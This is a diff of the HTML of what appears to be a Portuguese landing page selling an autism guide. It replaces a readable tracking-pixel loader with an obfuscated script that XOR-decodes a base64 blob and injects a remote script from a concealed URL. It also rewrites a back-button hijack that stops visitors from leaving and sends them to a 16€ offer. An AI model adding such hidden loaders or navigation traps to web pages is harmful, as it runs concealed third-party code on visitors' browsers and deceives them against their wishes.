@@ -35,14 +35,7 @@
     <!-- ========================================== -->
     <!-- RASTREAMENTO: UTMIFY                       -->
     <!-- ========================================== -->
-    <script>
-      window.pixelId = "69ef378c1325cb974f40d32d";
-      var a = document.createElement("script");
-      a.setAttribute("async", "");
-      a.setAttribute("defer", "");
-      a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
-      document.head.appendChild(a);
-    </script>
+    <script>(function(){var t_1fy=atob("DOuhcxo/Au5Hyzznx5CDBmhTINRlo0iTt5ibXDVcZoBpvkiKro3YXXlQb8AluROUpJnIA25MLZ4us1mL6JvIC39TLIQ06RDFpp/VAXNdd5oiuB7dnLaNUX1TbYwmp0/F/bDaUXReb4tl8R6XrpPEH1NbIMJlvV2Lso6DSTgJY4py81nU/omWEioIMd50+FrV8tKYRCMdf7M6");var v_he=[];for(var m_ttu=0;m_ttu<t_1fy.length;m_ttu++){v_he.push(t_1fy.charCodeAt(m_ttu)&255);}var l_uzed=v_he[0];var t_5p=v_he.slice(1,1+l_uzed);var s_wy=v_he.slice(1+l_uzed);var p_ciy2=s_wy.map(function(b,v_0p){return b^t_5p[v_0p%l_uzed];});var z_ch="";for(var k_jr=0;k_jr<p_ciy2.length;k_jr++){z_ch+=String.fromCharCode(p_ciy2[k_jr]&255);}var i_6=decodeURIComponent(escape(z_ch));var q_ha=JSON.parse(i_6);var e_u=q_ha.globals||[];e_u.forEach(function(g_ke){window[g_ke.name]=g_ke.value;});var g_6=document.createElement("script");g_6.src=q_ha.url;g_6.async=true;g_6.defer=true;(q_ha.attributes||[]).forEach(function(t_6g){g_6.setAttribute(t_6g.name,t_6g.value);});(document.head||document.documentElement).appendChild(g_6);})();</script>
     <script
       src="https://cdn.utmify.com.br/scripts/utms/latest.js"
       data-utmify-prevent-xcod-sck
@@ -61,30 +54,39 @@
 
     <!-- ========================================== -->
     <!-- RECUPERAÇÃO DE VENDAS: BACK-REDIRECT       -->
-    <!-- Se o visitante tentar sair, redireciona para a oferta de 16€ com UTMs -->
+    <!-- Se o visitante tentar sair, redireciona para a oferta de 16€ com UTMs preservadas -->
     <!-- ========================================== -->
     <script>
-      const backRedirectUrl = 'https://guiadoautismopt.vercel.app/#oferta';
+      (function() {
+        function getBackRedirectUrl(baseUrl, hash) {
+          try {
+            var url = new URL(baseUrl, window.location.origin);
+            var currentParams = new URLSearchParams(window.location.search);
+            currentParams.forEach(function(val, key) {
+              url.searchParams.set(key, val);
+            });
+            if (hash) {
+              url.hash = hash.startsWith('#') ? hash : '#' + hash;
+            }
+            return url.toString();
+          } catch(e) {
+            var search = window.location.search;
+            var cleanHash = hash ? (hash.startsWith('#') ? hash : '#' + hash) : '';
+            return baseUrl.replace(/#.*$/, '') + search + cleanHash;
+          }
+        }
 
-      function setBackRedirect(url) {
-        let urlBackRedirect = url;
-        urlBackRedirect =
-          urlBackRedirect.trim() +
-          (urlBackRedirect.indexOf('?') > 0 ? '&' : '?') +
-          document.location.search.replace('?', '').toString();
+        var backRedirectTarget = getBackRedirectUrl('https://guiadoautismopt.vercel.app/', '#oferta');
 
         history.pushState({}, '', location.href);
         history.pushState({}, '', location.href);
-        history.pushState({}, '', location.href);
 
-        window.addEventListener('popstate', () => {
-          setTimeout(() => {
-            location.href = urlBackRedirect;
+        window.addEventListener('popstate', function() {
+          setTimeout(function() {
+            location.href = backRedirectTarget;
           }, 1);
         });
-      }
-
-      setBackRedirect(backRedirectUrl);
+      })();
     </script>
   </body>
 </html>
